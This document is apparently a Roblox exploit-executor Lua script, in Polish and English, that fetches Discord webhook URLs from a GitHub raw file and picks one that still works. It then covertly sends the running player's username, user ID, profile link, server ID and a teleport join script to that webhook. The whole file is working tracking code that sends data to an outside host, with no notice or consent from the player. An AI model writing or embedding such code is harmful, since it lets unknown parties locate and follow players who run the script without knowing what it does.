

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")

local requestFunc = syn and syn.request or http_request or request or (fluxus and fluxus.request)

local RawURL = "https://raw.githubusercontent.com/OverlordCryx/NOTHING-X-X-X-NAHH/refs/heads/X/WEB-H"  

local Webhooks = {}
local success, response = pcall(function()
    return requestFunc({Url = RawURL, Method = "GET"})
end)

if success and response and response.Body then
    for webhook in string.gmatch(response.Body, "[^\r\n]+") do
        webhook = webhook:gsub("%s+", "")
        if webhook ~= "" then table.insert(Webhooks, webhook) end
    end
end

local function VerifyWebhook(webhook)
    local s, r = pcall(function() return requestFunc({Url = webhook, Method = "GET"}) end)
    if not s or not r or not r.Body then return false end
    local ds, data = pcall(function() return HttpService:JSONDecode(r.Body) end)
    if not ds or not data then return false end
    if data.code == 10015 then return false end
    return data.name and data.name ~= ""
end

local WebhookURL = nil
for _, wh in ipairs(Webhooks) do
    if VerifyWebhook(wh) then WebhookURL = wh break end
end

if not WebhookURL then warn("Brak webhooka") return end

local player = Players.LocalPlayer
local placeId = game.PlaceId
local gameName = MarketplaceService:GetProductInfo(placeId).Name
local jobId = game.JobId

local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
local joinLink = "https://www.roblox.com/games/" .. placeId .. "?gameInstanceId=" .. jobId

local joinScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '")'

local data = {
    username = "NOTHING 💢",
    embeds = {{
        title = "NOTHING",
        color = 16711680,
        fields = {
            {name = "Game Name", value = gameName, inline = true},
            {name = "Place ID", value = tostring(placeId), inline = true},
            {name = "Game ID", value = tostring(game.GameId), inline = true},
            {name = "Server ID", value = tostring(jobId), inline = false},
            {name = "Username", value = player.Name, inline = true},
            {name = "User ID", value = tostring(player.UserId), inline = true},
            {name = "User Profile", value = "[VIEW PROFILE](" .. profileLink .. ")", inline = false},
            {name = "Join Script", value = "```lua\n" .. joinScript .. "\n```", inline = false}
        },
        footer = {text = "NOTHING"},
        timestamp = DateTime.now():ToIsoDate()
    }}
}

pcall(function()
    requestFunc({
        Url = WebhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end)

